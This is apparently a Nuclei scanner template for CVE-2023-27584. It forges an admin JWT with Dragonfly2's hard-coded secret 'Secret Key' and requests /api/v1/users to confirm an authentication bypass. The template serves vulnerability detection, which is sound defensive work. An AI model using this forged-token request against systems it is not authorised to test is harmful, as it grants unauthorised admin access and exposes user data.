http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"id":'
    - '"created_at":'
    - '"updated_at":'
    - '"state":'
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /api/v1/users HTTP/1.1

    Host: {{Hostname}}

    Cookie: jwt={{generate_jwt(payload,"HS256","Secret Key") }}

    '
id: CVE-2023-27584
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2023-27584
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-321
    epss-percentile: 0.98376
    epss-score: 0.64638
  description: 'Dragonfly is an open source P2P-based file distribution and image
    acceleration system. It is hosted by the Cloud Native Computing Foundation (CNCF)
    as an Incubating Level Project. Dragonfly uses JWT to verify user. However, the
    secret key for JWT, "Secret Key", is hard coded, which leads to authentication
    bypass. An attacker can perform any action as a user with admin privileges. This
    issue has been addressed in release version 2.0.9. All users are advised to upgrade.
    There are no known workarounds for this vulnerability.

    '
  impact: 'Unauthenticated attackers can bypass authentication using a hardcoded JWT
    secret key, allowing them to perform any action with admin privileges including
    accessing all distributed files and compromising the entire P2P system.

    '
  metadata:
    max-request: 1
    verified: true
  name: Dragonfly2 < 2.1.0-beta.1 - Hardcoded JWT Secret
  reference:
  - https://github.com/advisories/GHSA-hpc8-7wpm-889w
  - https://github.com/dragonflyoss/Dragonfly2/releases/tag/v2.0.9
  - https://github.com/dragonflyoss/Dragonfly2/security/advisories/GHSA-hpc8-7wpm-889w
  - https://nvd.nist.gov/vuln/detail/cve-2023-27584
  remediation: 'Upgrade to Dragonfly2 version 2.0.9 or later that uses a properly
    generated JWT secret key.

    '
  severity: critical
  tags: cve,cve2023,dragonfly,exposure,jwt,secret,vuln
variables:
  exp: '{{to_number(orig_iat)+4000 }}'
  orig_iat: '{{to_unix_time(unixtime())}}'
  payload: '{"id":1,"exp":{{exp}},"orig_iat":{{orig_iat}}}'
